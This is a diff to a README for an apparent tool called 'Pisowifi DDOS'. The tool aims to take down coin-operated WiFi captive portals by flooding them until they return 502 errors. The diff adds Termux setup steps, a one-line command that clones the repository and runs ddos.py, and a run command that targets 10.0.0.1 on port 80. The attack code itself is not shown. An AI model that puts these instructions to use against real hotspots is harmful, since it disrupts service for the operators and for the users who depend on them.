@@ -1,14 +1,18 @@
 # Pisowifi DDOS
-Pisowifi 502 Bad Gateway and take down captive portal.
+502 Bad Gateway and take down the captive portal.
 
 <div align="center">
 <img src="https://github.com/xiv3r/pisowifi-ddos/blob/main/image/proof.png">
 </div>
 
-# Installation
+# Requirements
+- Termux
+
+# Auto Install
 ```
 pkg update && pkg upgrade -y && pkg install python3 -y && git clone https://github.com/xiv3r/pisowifi-ddos && cd pisowifi-ddos && python3 ddos.py
 ```
+
 # Run
 ```
 python3 ddos.py -t 10.0.0.1 -p 80 -t 135
